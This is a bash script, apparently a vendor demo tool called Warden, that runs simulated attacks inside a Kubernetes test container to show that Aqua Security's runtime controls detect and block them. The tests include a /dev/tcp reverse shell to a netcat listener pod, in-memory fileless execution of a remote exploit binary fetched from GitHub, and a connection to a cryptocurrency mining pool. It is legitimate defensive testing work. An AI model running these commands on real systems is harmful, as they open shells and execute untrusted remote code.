#!/bin/bash

# print_logo() {
#     echo "                                                                                          "
#     echo "                                                                                          "
#     echo "                                                                                          "
#     echo "         .:-----=##*.       .--=--.         :-==-:      ::.        :::     .:-==-.        "
#     echo "        :-------=%%%:     -#%%%%%%%#-     +%%%%%%%%*:   %%*        %%#   :#%%%%%%%#-      "
#     echo "      :-        :%%%:    *%%+:   :+%%*  .#%%=.  .-#%%-  %%*        %%#  +%%+:   :+%%*     "
#     echo "    .---        :%%%:   =%%=       =%%- *%%.       #%%  %%*        %%# -%%+       -%%=    "
#     echo "    .---        :%%%:   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
#     echo "    .---        :%%%:   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
#     echo "    .---        :#+:     #%%=.     -%%= .%%#-      *%%  =%%+.    :#%%.  #%%=.     .%%+    "
#     echo "    :***++++++++-.        =%%%%#####%%=  .+%%%##*: *%%   -*%%%##%%%+.    -#%%%#####%%+    "
#     echo "    :#########+.            .-=+++++++:     :==-   *%%     .-=++=:         .-=+++++++-    "
#     echo "                                                   *%%                                    "
#     echo "                                                   *%%                                    "
#     echo "                                                   *%%                                    "
#     echo "                                                                                          "
#     echo "                                                                                          "
#     echo "     Tool developed by: Stan Hoe, Solution Architect APJ                                       "
#     echo "                                                                                          "
#     echo "                                                                                          "
# }


print_logo() {
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "                                                                                          "
    echo -e "         \033[0;33m.:-----\033[0m\033[0;31m=##*.\033[0m       .--=--.         :-==-:      ::.        :::     .:-==-.        "
    echo -e "        \033[0;33m:-------\033[0m\033[0;31m=%%%:\033[0m     -#%%%%%%%#-     +%%%%%%%%*:   %%*        %%#   :#%%%%%%%#-      "
    echo -e "      \033[0;36m:-\033[0m        \033[0;31m:%%%:\033[0m    *%%+:   :+%%*  .#%%=.  .-#%%-  %%*        %%#  +%%+:   :+%%*     "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%=       =%%- *%%.       #%%  %%*        %%# -%%+       -%%=    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:%%%:\033[0m   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo -e "    \033[0;36m.---\033[0m        \033[0;31m:#+:\033[0m     #%%=.     -%%= .%%#-      *%%  =%%+.    :#%%.  #%%=.     .%%+    "
    echo -e "    \033[0;34m:***++++++++-.\033[0m        =%%%%#####%%=  .+%%%##*: *%%   -*%%%##%%%+.    -#%%%#####%%+    "
    echo -e "    \033[0;34m:#########+.\033[0m            .-=+++++++:     :==-   *%%     .-=++=:         .-=+++++++-    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo -e "                                                   *%%                                    "
    echo "                                                                                          "
    echo "                                                                                          "
    echo "     Tool developed by: Stan Hoe, Solution Architect APJ                                       "
    echo "                                                                                          "
    echo "                                                                                          "
}


print_welcome_message() {
    echo "=========================================================================================="
    echo "                    Welcome to Warden, the Aqua Runtime Security POV Tool                 "
    echo "=========================================================================================="
    echo "                                                                                          "
    echo "     Explore various security features of Aqua Security with this interactive tool.       " 
    echo "     Experience Real-time Malware Protection, Drift Prevention, and much more.            "
    echo "     Get ready to dive into container security with Aqua!                                 "
    echo "                                                                                          "
    echo "=========================================================================================="
}

print_colored_message() {
    local color="$1"
    local message="$2"

    case "$color" in
        red)
            echo -e "\033[0;31m$message\033[0m"
            ;;
        blue)
            echo -e "\033[0;34m$message\033[0m"
            ;;
        green)
            echo -e "\033[0;32m$message\033[0m"
            ;;
        yellow)
            echo -e "\033[0;33m$message\033[0m"
            ;;
        *)
            echo "Invalid color. Please choose from: red, blue, green, yellow."
            ;;
    esac
}

check_kubernetes_connection() {
    echo -n "Checking Kubernetes connection"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if connected to a Kubernetes cluster
    if kubectl cluster-info &>/dev/null; then
        print_colored_message green "✓ Kubernetes cluster connected"
        echo
    else
        print_colored_message red "✗ Error: Not connected to a valid Kubernetes cluster."
        exit 1
    fi
}


check_aqua_agent_daemonset() {
    echo -n "Checking Aqua Enforcer (aqua-agent) daemonset"
    for i in {1..10}; do
        echo -n "."
        sleep 0.2
    done
    print_colored_message green "[✓] Done"

    # Check if aqua-agent daemonset exists in the aqua namespace
    if kubectl get daemonset -n aqua aqua-agent &>/dev/null; then
        print_colored_message green "✓ Aqua Enforcer daemonset found"
        echo
    else
        print_colored_message red "✗ Error: Aqua Enforcer daemonset not found. Please deploy the Aqua Enforcer."
        exit 1
    fi
}

check_container_existence() {
    # Check if the aqua-test-container deployment already exists
    kubectl get deployment aqua-test-container >/dev/null 2>&1
    return $?
}

test_realtime_malware_protection() {
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Real-time Malware Protection Control enabled
    2. Ensure that the Real-time Malware Protection Control is set to 'Delete' action
    3. Ensure that the Custom Policy is set to 'Enforce' mode"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'ls -la' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- ls -la
                sleep 1.5
                echo
                print_colored_message yellow "Executing wget command in the container to download eicar AMP test file..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget https://raw.githubusercontent.com/stanezil/eicar/main/eicar.txt
                if [ $? -eq 0 ]; then
                    echo
                    print_colored_message yellow "Eicar AMP test file downloaded successfully."
                else
                    echo
                    print_colored_message red "Failed to download Eicar AMP test file."
                fi
                sleep 1.5
                echo
                print_colored_message yellow "Executing 'ls -la' command again in the container..."
                echo
                print_colored_message yellow "[!] Observe in the output below that the downloaded eicar file is not in sight because it has been deleted by Aqua."
                echo 
                kubectl exec -it $pod_name --container $container_name -- ls -la
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."

            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_drift_prevention() {
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Drift Prevention Control enabled
    2. Ensure that the Custom Policy is set to 'Enforce' mode"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Make a copy of /bin/ls and execute the copy
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Copying '/bin/ls' to '/tmp/ls_copy' in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- cp /bin/ls /tmp/ls_copy"
                kubectl exec -it $pod_name --container $container_name -- cp /bin/ls /tmp/ls_copy
                echo
                print_colored_message yellow "Executing '/tmp/ls_copy' command in the container..."
                echo
                echo "kubectl exec -it $pod_name --container $container_name -- /tmp/ls_copy"
                kubectl exec -it $pod_name --container $container_name -- /tmp/ls_copy
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_block_cryptocurrency_mining() {
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Block Cryptocurrency Mining Control enabled
    2. Ensure that the Custom Policy is set to 'Enforce' mode"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_block_fileless_execution() {
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Block Fileless Execution Control enabled
    2. Ensure that the Custom Policy is set to 'Enforce' mode
    3. Ensure that Drift Prevention Control is disabled"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing 'wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64
                echo
                print_colored_message yellow "Executing 'chmod +x memit-linux-amd64' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- chmod +x memit-linux-amd64
                echo
                print_colored_message yellow "Executing './memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- ./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_reverse_shell() {
    # Ask user if prerequisites are met
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Reverse Shell Control enabled
    2. Ensure that the Custom Policy is set to 'Enforce' mode"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                # Create a Centos pod with nc listener
                echo
                print_colored_message yellow "Creating Centos pod"
                echo
                kubectl run centos --image=stanhoe/centos-nc:7 --command sleep infinity
                echo
                print_colored_message yellow "Waiting for the Centos container pod to start running..."
                while ! kubectl get pods | grep centos | grep -q "Running"; do
                    sleep 5
                done
                echo
                print_colored_message yellow "Centos container pod is running. Configuring nc listener in Centos pod..."
                echo
                kubectl exec centos -- bash -c "nohup nc -l -p 12345 >/dev/null 2>&1 &" 
                echo
                print_colored_message yellow "Retrieving IP address..."
                centos_pod_ip=$(kubectl get pods -o wide | grep centos | awk '{print $6}')
                echo "$centos_pod_ip"
                echo
                print_colored_message yellow "Executing reverse shell from Aqua test container to Centos container..."
                echo
                aqua_test_container=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                kubectl exec -it $aqua_test_container -- bash -c "exec id &>/dev/tcp/$centos_pod_ip/12345 <&1"
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua".
                echo
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

test_executables_blocked() {
    echo
    print_colored_message yellow "[!] In order to test out the use case successfully, please ensure that the following prerequisites are met:
    1. Create a Custom Policy with Executables Block Control enabled
    2. Add '/bin/whoami' to the list of blocked executables 
    3. Ensure that the Custom Policy is set to 'Enforce' mode"
    echo
    read -p "Proceed? (y/n): " prerequisites_met

    case $prerequisites_met in
        [Yy]*)
            # Execute commands in the deployed container
            if check_container_existence; then
                pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                echo
                print_colored_message yellow "Executing the blocked 'whoami' command in the container..."
                echo
                kubectl exec -it $pod_name --container $container_name -- /bin/whoami
                echo
                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because it has been blocked by Aqua."
                echo
                print_colored_message green "[✓] Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
            else
                print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
            fi
            ;;
        [Nn]*)
            echo "Please ensure the prerequisites are met before proceeding."
            ;;
        *)
            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
            ;;
    esac
}

# Function to execute a shell session in the test application container
exec_into_test_application() {
    if check_container_existence; then
        pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
        container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
        echo "Executing shell session in the Aqua test application container..."
        echo
        kubectl exec -it $pod_name --container $container_name -- /bin/bash
    else
        print_colored_message yellow "[!] Aqua test container is not deployed. Please deploy it first with option 1."
    fi
}

check_pod_status() {
    local pod_name=$1
    kubectl get pods | grep $pod_name | grep -q "Running"
}

deploy_test_container() {
    # Check if the aqua-test-container deployment already exists
    if check_container_existence; then
        echo "Aqua test container already exists. Redeploying..."
        delete_test_container
    fi

    echo
    print_colored_message yellow "Deploying Aqua test container..."
    # Deploying the container using kubectl
    kubectl create deployment aqua-test-container --image=stanhoe/ubuntu-wget:latest -- sleep infinity

    # Wait for the deployment to complete
    echo
    print_colored_message yellow "Waiting for the deployment to complete..."
    kubectl wait --for=condition=available deployment/aqua-test-container --timeout=60s

    # Check if deployment was successful
    if [ $? -eq 0 ]; then
        echo
        print_colored_message green "✓ Aqua test container deployed successfully."
        echo
    else
        print_colored_message red " Failed to deploy Aqua test container."
        echo
    fi
}

delete_test_container() {
    echo "Deleting Aqua test container..."
    kubectl delete deployment aqua-test-container
}

main() {
    print_logo
    print_welcome_message
    echo

    check_kubernetes_connection
    check_aqua_agent_daemonset

    # Check if Aqua test container exists
    if check_container_existence; then
        echo "Aqua test container already exists."
        read -p "Would you like to redeploy the test application? (y/n): " redeploy_choice
        if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
            delete_test_container
            deploy_test_container
            echo
        else
            echo "Proceeding to menu..."
            echo
        fi
    else
        print_colored_message yellow "[!] Aqua test container does not exist - Select option 1 to deploy."
        echo
        echo "Proceeding to menu..."
        echo 
    fi
    echo

    while true; do
        echo "Please select an option:"
        echo "1. Deploy/Redeploy test container"
        echo "2. Test Real-time Malware Protection [Delete action]"
        echo "3. Test Drift Prevention"
        echo "4. Test Block Cryptocurrency Mining"
        echo "5. Test Block Fileless Execution [Must Turn off Drift Prevention Control in Aqua Console]"
        echo "6. Test Reverse Shell"
        echo "7. Test Executables Blocked [/bin/whoami] > Not working due to SLK-76766"
        echo "8. Exec into Test Application Container"
        echo "9. Terminate Program"
        echo

        read -p "Enter your choice (1-9): " choice

        case $choice in
            1)
                deploy_test_container
                ;;
            2)
                test_realtime_malware_protection
                ;;
            3)
                test_drift_prevention
                ;;
            4)
                test_block_cryptocurrency_mining
                ;;
            5)
                test_block_fileless_execution
                ;;
            6)
                test_reverse_shell
                ;;
            7)
                test_executables_blocked
                ;;
            8)
                exec_into_test_application
                ;;
            9)
                # Terminate the program
                read -p "Are you sure you want to terminate the program? (y/n): " terminate_choice
                case $terminate_choice in
                    [Yy]*)
                        if check_container_existence || check_pod_status "centos"; then
                            read -p "Do you want to delete the Aqua test container before termination? (y/n): " delete_container
                            if [[ $delete_container =~ ^[Yy] ]]; then
                                delete_test_container
                                kubectl delete pod centos --force 
                            elif [[ $delete_container =~ ^[Nn] ]]; then
                                echo "Exiting program without deleting the Aqua test container."
                            else
                                echo "Invalid input. Exiting program without deleting the Aqua test container."
                            fi
                        else
                            echo "Aqua test container or Centos container is not running."
                            echo "Exiting program without deleting the Aqua test container."
                        fi
                        exit
                        ;;
                    [Nn]*)
                        echo "Cancelled termination. Returning to the main menu."
                        ;;
                    *)
                        echo "Invalid input. Returning to the main menu."
                        ;;
                esac
                ;;
            *)
                echo "Invalid choice. Please choose a valid option."
                echo
                ;;
        esac

        echo
        # Add a short delay before showing the options menu again
        sleep 2
    done
}

main
